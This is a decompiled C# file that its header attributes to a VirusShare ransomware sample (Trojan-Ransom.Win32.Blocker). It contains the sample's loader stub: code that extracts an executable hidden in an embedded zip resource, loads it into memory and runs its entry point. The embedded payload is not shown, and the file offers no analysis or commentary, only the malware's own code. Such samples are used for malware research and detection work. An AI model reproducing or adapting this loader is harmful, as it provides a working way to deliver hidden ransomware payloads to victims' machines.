// Decompiled with JetBrains decompiler
// Type: R.P
// Assembly: bin, Version=2.0.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 723F527A-C78C-49B9-82B8-2C5FA9395341
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.azzk-7c44234b14488c98120ef98731df27ddb3fd8e1a.exe

using System;
using System.IO;
using System.IO.Packaging;
using System.Reflection;
using System.Windows.Forms;

namespace R
{
  internal static class P
  {
    private static Assembly L(Package p, string u)
    {
      Uri partUri = new Uri(u, UriKind.Relative);
      byte[] numArray;
      using (Stream stream = p.GetPart(partUri).GetStream())
      {
        numArray = new byte[(int) stream.Length];
        stream.Read(numArray, 0, numArray.Length);
      }
      Assembly assembly = Assembly.Load(numArray);
      return !((Assembly) null == assembly) ? assembly : throw new ArgumentException("Unable to load assembly: " + u);
    }

    [STAThread]
    private static void Main(string[] args)
    {
      try
      {
        using (Stream manifestResourceStream = typeof (P).Assembly.GetManifestResourceStream("a.zip"))
        {
          using (Package p = Package.Open(manifestResourceStream, FileMode.Open, FileAccess.Read))
            P.L(p, "/bin.exe").EntryPoint.Invoke((object) null, new object[0]);
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.GetType().Name + Environment.NewLine + ex.Message + Environment.NewLine + ex.StackTrace);
      }
    }
  }
}
